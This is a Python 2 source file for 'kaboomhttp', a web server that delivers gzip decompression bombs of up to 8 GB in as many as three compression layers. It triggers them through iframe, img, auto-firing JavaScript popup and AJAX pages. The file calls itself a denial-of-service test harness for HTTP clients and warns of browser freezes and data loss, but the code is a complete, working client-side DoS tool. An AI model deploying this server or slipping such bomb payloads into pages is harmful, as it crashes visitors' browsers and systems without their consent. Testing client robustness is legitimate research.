'''
Created on Oct 6, 2012

This is the kaboomhttp, a web server that serves HTTP bombs
using different attack vector.

If serves two types of bombs:
1) single compressed HTTP bombs. Try it yourself: run and visit http://ip:port/

2) multiple compressed HTTP bombs. Not implemented in the home page, 
   available only via direct access to each bomb. Use the parameter g=<int>
   
Please note that all the bombs served MUST be in data/. For the name 
convention, have a look at the code below.


@author: gianko
'''
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
import threading
import urlparse
import sys

import utils.log
import utils.io

LOG = None

TEST_PAGE = """
<html>
    <head>
        <title>Test page</title>
        <meta http-equiv="PRAGMA" content="NO-CACHE"/>
    </head>
    <body>
        <h2>kabooom httpd</h2>
       
        <h3>Denial-of-Service tests for HTTP client</h3>
        
        <h4>Disclaimer:</h4>
        <p>The outcomes of these tests is unpredictable. It may hurt freeze browser, freeze your OS, and cause data loss. <b>Use at your own risk</b>.</p>
        
        <h4>Use:</h4>
        <p>Choose the type of test, then input proper value for $n and $s. Finally, click on <i>Strike!</i> to request the bombs.</p>
        
        <h4>Parameters:</h4>       
        <p>Meaning: $n = number of requests; $s = size of the bomb in bits, e.g. $s=34 means |bomb| = 8 GB.</p>
        
        <p>Ranges: 1 =&lt; $n =&lt; 12 and 8 =&lt; $s =&lt; 34 </p>
        
        <h4>Tests:</h4>
        <ul>
            <li>
                <b>IFRAME</b>: $n iframes requesting a pow(2,$s) bomb each.</p>
                <form name="input" action="IFRAME" method="get">
                    $n:<input type="text" name="n">
                    $s:<input type="text" name="s">
                    <input type="submit" value="Strike!">
                </form>
            </li>
            
            <li>
                <b>IMG</b>: $n img tags requesting a pow(2,$s) bomb each.</p>
                <form name="input" action="IMG" method="get">
                    $n:<input type="text" name="n">
                    $s:<input type="text" name="s">
                    <input type="submit" value="Strike!">
                </form>
            </li>
            
            <li>
                <b>JS popup</b>: $n javascript:window.open(...) requesting a pow(2,$s) bomb each.</p>
                <form name="input" action="POPUP" method="get">
                    $n:<input type="text" name="n">
                    $s:<input type="text" name="s">
                    <input type="submit" value="Strike!">
                </form>
            </li>
            
            <li>
                <b>AJAX</b>: $n xmlhttp.open("GET", ..., true) requesting a pow(2,$s) bomb each.</p>
                <form name="input" action="AJAX" method="get">
                    $n:<input type="text" name="n">
                    $s:<input type="text" name="s">
                    <input type="submit" value="Strike!">
                </form>
            </li>
        
        </ul>

    </body>
</html>"""

IFRAME_BOMB = """
<html>
    <head>
        <title>IFRAME bombing test</title>
        <meta http-equiv="PRAGMA" content="NO-CACHE"/>
    </head>
    <body>
        <h2>kabooom httpd</h2>
       
        <h3>Denial-of-Service tests for HTTP client</h3>
        
        <p>IFRAME: Fetching zipbombs...</p>
        
        %(code)s
    </body>
</html>"""

IFRAME = """<iframe src="%(bomb)s" >Boom %(i)s...</iframe>"""

IMG_BOMB = """
<html>
    <head>
        <title>IMG bombing test</title>
        <meta http-equiv="PRAGMA" content="NO-CACHE"/>
    </head>
    <body>
        <h2>kabooom httpd</h2>
       
        <h3>Denial-of-Service tests for HTTP client</h3>
        
        <p>IMG: Fetching zipbombs...</p>
        
        %(code)s
    </body>
</html>"""

IMG = """<img src="%(bomb)s"/>"""

POPUP_BOMB = """
<html>
    <head>
        <title>JS Popup bombing test</title>
        <script type="text/javascript">
            function fire() {
                %(code)s
            }
        </script>
    </head>
    <body onload="fire()">
        <h2>kabooom httpd</h2>
       
        <h3>Denial-of-Service tests for HTTP client</h3>
        
        <p>JS Popups: Fetching zipbombs...</p>
        
    </body>
</html>"""

POPUP = """window.open( "%(bomb)s" );"""

AJAX_BOMB = """
<html>
    <head>
        <title>AJAX bombing test</title>
        <meta http-equiv="PRAGMA" content="NO-CACHE"/>
        <script type="text/javascript">
            function fire() {
                %(code)s
            }
        </script>
    </head>
    <body onload="fire()">
        <h2>kabooom httpd</h2>
       
        <h3>Denial-of-Service tests for HTTP client</h3>
        
        <p>AJAX: Fetching zipbombs...</p>
    </body>
</html>"""

AJAX = """xmlhttp%(i)s=new XMLHttpRequest();xmlhttp%(i)s.open("GET","%(bomb)s",true);xmlhttp%(i)s.send();"""

ERROR_PAGE = """<html>
    <head>
        <title>404 - Page not found</title>
        <meta http-equiv="PRAGMA" content="NO-CACHE"/>
    </head>
    <body>
        <h2>kabooom httpd</h2>
       
        <h3>Denial-of-Service tests for HTTP client</h3>
        
        <p>Ooops! Wrong parameters or this resource is not here.</p>
        
        <p><a href="/">Main page</a>
    </body>
</html>
"""

class ZipBombServer(BaseHTTPRequestHandler):
    
    def do_GET(self):
        tname =  threading.currentThread().getName()
        url = urlparse.urlparse(self.path)
        LOG.info("%s, Resource %s" % (tname, self.path))
        LOG.info("%s, Content Encoding Accepted: %s" % (tname, self.headers.get("accept-encoding", "")))
        LOG.info("%s, User agent %s" % (tname, self.headers.get("user-agent", "")))
        if url.path == "/":
            LOG.info("INDEX PAGE")

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.send_header("Content-Length", len(TEST_PAGE))
            self.end_headers()
            self.wfile.write(TEST_PAGE)
        elif url.path in ["/IFRAME", "/IMG", "/POPUP", "/AJAX"]:
            qs = urlparse.parse_qs(url.query)
            LOG.info("BOMBING PAGE")

            n = qs.get("n", ["0"])[0]
            s = qs.get("s", ["0"])[0]
            try:
                n = int(n) # number of bombs
                s = int(s) # size in bits
                if n in range(1, 13) and s in range(16, 35):
                    type = url.path[1:]

                    htmlpage = globals()["%s_BOMB" % type]

                    code = ""
                    for i in range(0, n):
                        code += globals()[type] % {"bomb": "bomb?s=%s&n=%s" % (s, i+1), "i":i+1}
                    
                    htmlpage = htmlpage % {'code': code}
                    
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.send_header("Content-Length", len(htmlpage))
                    self.end_headers()
                    self.wfile.write(htmlpage)
                else:
                    LOG.error("%s, Parameter(s) out of range: n=%s, s=%s" % (tname, n, s))
                    self.serve_404() 
            except Exception as e:
                LOG.error("%s, Exception %s. Requested n=%s, s=%s" % (tname, e, n, s))
                self.serve_404()
        elif url.path == "/bomb" or url.path == "/htmlbomb":
            qs = urlparse.parse_qs(url.query)
            n = qs.get("n", ["0"])[0]
            s = qs.get("s", ["0"])[0]
            g = qs.get("g", ["1"])[0]
            try:
                n = int(n) # number of bombs
                s = int(s) # size in bits
                g = int(g) # number of compression layers
                if n in range(1, 13) and s in range(16, 35) and g in range(1, 4):
                    try:
                        LOG.info("SERVING A BOMB %s bit WITH %s layers" % (s, g))
                        data = utils.io.read_from_file("data/www/html%sbit%s" % (s, ".gz" * g))
                        #data = utils.io.read_from_file("data/%sbit.zip" % s)

                        clen = len(data)
                        """Respond to a GET request."""
                        self.send_response(200)
                        self.send_header("Content-type", "text/html")#"image/jpeg") 
                        self.send_header("Accept-Ranges", "bytes")
                        self.send_header("Content-Length", clen)
                        self.send_header("Content-Encoding", str("gzip, " * g)[0:-2])
                        self.end_headers()
                        self.wfile.write(data)
                    except Exception as e:
                        LOG.error("%s, Exception %s" % (tname, e))
                        self.serve_404()
                else:
                    LOG.error("%s, Parameter(s) out of range: n=%s, s=%s" % (tname, n, s))
                    self.serve_404() 
            except Exception as e:
                LOG.error("%s, Exception %s. Requested n=%s, s=%s" % (tname, e, n, s))
                self.serve_404()
        else:
            LOG.info("%s, Not serving %s" % (tname, self.path))
            self.serve_404()

    def serve_404(self):  
        self.send_response(404)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(ERROR_PAGE) 


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""

def main():
    global LOG
    LOG = utils.log.getdebuglogger("zipbomb")
    HOST_NAME = "127.0.0.1"
    PORT_NUMBER = 80
    
    if len(sys.argv) == 3:
        HOST_NAME = sys.argv[1]
        PORT_NUMBER = int(sys.argv[2])
    
    server_class = ThreadedHTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), ZipBombServer)
    LOG.info("Server Starts - %s:%s" % (HOST_NAME, PORT_NUMBER))
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    
    LOG.info("Server Stops - %s:%s" % (HOST_NAME, PORT_NUMBER))  

if __name__ == '__main__':
    main()
